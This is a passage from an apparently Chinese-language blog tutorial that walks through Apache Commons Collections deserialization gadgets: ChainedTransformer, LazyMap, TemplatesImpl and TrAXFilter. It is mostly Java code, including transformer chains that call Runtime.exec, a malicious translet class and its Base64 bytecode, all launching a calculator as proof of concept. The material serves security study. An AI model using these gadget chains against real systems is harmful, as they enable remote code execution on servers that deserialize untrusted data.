class="number">0</span>]&#125;),<span class="comment">//getRuntime是静态方法，得到Runtime类</span></span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)<span class="comment">//反射调用Runtime类的exec方法</span></span><br><span class="line">     &#125;;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//ChainedTransformer实例</span></span><br><span class="line">     <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">     chainedTransformer.transform(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><blockquote><p>如果给这个函数传入null的话，会直接抛出 NullPointerException 空指针异常，但传入new Class [0]的话则不会抛异常</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                  Object... args)</span></span><br><span class="line">           <span class="keyword">throws</span> IllegalAccessException,</span><br><span class="line">                  IllegalArgumentException,</span><br><span class="line">                  InvocationTargetException</span><br></pre></td></tr></table></figure></div><p>对带有指定参数的指定对象调用由此 Method 对象表示的底层方法。个别参数被自动解包，以便与基本形参相匹配，基本参数和引用参数都随需服从方法调用转换。</p><p>如果底层方法是静态的，那么可以忽略指定的 <code>obj</code> 参数。该参数可以为 null。 </p><p>如果底层方法所需的形参数为 0，则所提供的 <code>args</code> 数组长度可以为 0 或 null。 </p></blockquote><h3 id="LazyMap–触发ChainedTransformer-的-transform-方法"><a href="#LazyMap–触发ChainedTransformer-的-transform-方法" class="headerlink" title="LazyMap–触发ChainedTransformer 的 transform 方法"></a>LazyMap–触发ChainedTransformer 的 transform 方法</h3><p>主要利用其中的get方法</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//可控制 factory 为 ChainedTransformer</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//利用 get 方法可实现调用 ChainedTransformer#transform()</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="comment">//关键点</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>测试</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试 LazyMap</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="comment">//Transformer数组</span></span><br><span class="line">     Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">             <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">     &#125;;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//ChainedTransformer实例</span></span><br><span class="line">     <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">     <span class="type">Map</span> <span class="variable">uselessMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">     <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(uselessMap, chainedTransformer);</span><br><span class="line">     lazyMap.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h4 id="TemplatesImpl（重要）"><a href="#TemplatesImpl（重要）" class="headerlink" title="TemplatesImpl（重要）"></a>TemplatesImpl（重要）</h4><p>这个类不在 Apache Commons Collections 中。但是 TemplatesImpl 这个类很特殊，我们可以借助其动态加载包含恶意的字节码，部分简化代码如下：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关键方法：newTransformer()</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">                <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">            &#123;</span><br><span class="line">                TransformerImpl transformer;</span><br><span class="line">                <span class="comment">// 关键点，调用 getTransletInstance()</span></span><br><span class="line">                transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">                    _indentNumber, _tfactory);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//继续跟进 getTransletInstance() 方法：</span></span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//先判断是否为 null，如果为 null 的话去加载字节码，紧接着 newInstance() 对其实例化。</span></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            …………</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//继续跟进 defineTransletClasses() 方法:</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        …………</span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        …………</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);  <span class="comment">//关键点</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//继续跟进 TransletClassLoader，这个类里重写了 defineClass 方法</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);   <span class="comment">//关键点</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>恶意字节码的生成：<br>HelloTemplatesImpl.java，主要其必须继承 AbstractTranslet 类，</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HelloTemplatesImpl.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloTemplatesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>我们将其编译为 HelloTemplatesImpl.class，然后进行 Base64 编码，得到如下结果：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj</span><br></pre></td></tr></table></figure></div><p>测试</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试 TemplatesImpl</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射设置 Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="comment">//恶意字节码</span></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射设置 Field</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//弹计算器</span></span><br></pre></td></tr></table></figure></div><p>所以我们只需传入恶意字节码给 TemplatesImpl，然后调用其 newTransformer 方法。那么有没有类可以调用 TemplatesImpl.newTransformer()，这里先介绍一个构造 CC3 中将会用到的类 TrAXFilter，下面是其构造函数：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();    <span class="comment">//关键点</span></span><br><span class="line">        …………</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>测试</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 测试 TrAXFilter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反射设置 Field</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span 